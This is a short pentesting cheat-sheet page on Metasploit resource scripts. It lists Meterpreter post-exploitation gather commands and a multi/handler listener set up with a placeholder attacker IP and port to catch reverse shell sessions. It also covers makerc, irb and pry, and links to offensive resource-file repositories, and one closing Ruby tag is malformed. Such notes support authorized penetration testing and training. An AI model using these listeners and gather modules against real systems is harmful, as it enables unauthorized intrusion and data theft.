# Resource

TODO: Provide resource scripts to automate the process in metasploit

## Meterpreter

```
run post/multi/gather/run_console_rc_file

run post/multi/gather/multi_command

run post/multi/manage/multi_post

meterpreter > run multi_console_command
```

```rb
<ruby>
run_single("exploit -j -z")
</ruby>
```

```rb
<ruby>
use exploit/multi/handler
set payload <payload_module>
set lhost <attacker_IP>
set lport <attacker_PORT>
set ExitOnSession false
exploit -j
<ruby>
```

Save the initial commands that were executed to a file.

```
msf > makerc
```

## Meta Shell

```
resource /path/to/local/resource_1.rc /path/to/local/resource_n.rc
```

## 08 - Interactive Ruby Shell

```
irb
```

## 09 - Debug Current Session

### Meterpreter

```
meterpreter > pry
```

### Meta Shell

```
pry
```

---
## References

### Source Repositories

- [r00t-3xp10it: RC exploiter](https://github.com/r00t-3xp10it/RC-exploiter)

- [r00t-3xp10it: Resource Files](https://github.com/r00t-3xp10it/resource_files)

- [r00t-3xp10it: metasploit_resource_files](https://github.com/r00t-3xp10it/hacking-material-books/blob/master/metasploit-RC%5BERB%5D/metasploit_resource_files.md)

- [r00t-3xp10it: msf-auxiliarys](https://github.com/r00t-3xp10it/msf-auxiliarys/wiki/Welcome-to-the-msf-auxiliarys-wiki!)

### RubyFu

- [RubyFu: API and Extensions](https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/meterpreter/api-and-extensions)

- [RubyFu: Meterpreter Scripting](https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/meterpreter/meterpreter-scripting)

- [RubyFu: Railgun API Extension](https://rubyfu.net/module-0x5-or-exploitation-kung-fu/metasploit/meterpreter/railgun-api-extension)